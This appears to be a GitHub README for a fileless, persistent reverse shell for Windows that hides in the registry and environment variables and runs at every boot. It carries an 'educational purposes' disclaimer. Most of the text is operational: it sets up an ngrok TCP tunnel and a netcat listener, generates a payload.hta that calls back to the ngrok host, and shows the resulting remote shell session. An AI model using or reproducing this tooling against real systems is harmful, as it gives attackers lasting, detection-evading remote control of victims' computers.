# Living off the land (LOTL) persistent reverse shell for windows
This is a fileless living off the land reverse shell written in JScript and Powershell script. It runs every time the windows boots and relies solely on windows registry and environment variables to execute without creating any files on the system<br>
Disclaimer: this program is only for educational purposes
## Proof of concept
WARNING: Since editing windows registries can cause some problems, I really recommend running this program on a virtual machine<br>
download the repository and run POC.hta file on your windows system<br>
Now every time you reboot your windows a messagebox with 'living off the land' message will appear
![alt text](https://github.com/Null-byte-00/LOTL/blob/main/LOTL.png?raw=true)
## Reverse shell
In this case I'm using ngrok to make a tcp tunnel:
```
ngrok tcp 3333
```
then we run netcat to listen on port 3333
```
nc -nvlp 3333
```
### creating payload 
Now we can create out payload with our ngrok tunnel's domain and port 
```
python.exe generator.py 8.tcp.ngrok.io 18053 payload.hta
```
all you have to do now is to run payload.hta in your windows machine and you get a reverse shell
```
┌─[parrot@parrot]─[~]
└──╼ $nc -nvlp 3333
listening on [any] 3333 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 50662
> echo hello
hello
> 
```
this reverse shell is persistent meaning every time you boot the windows the payload will execute
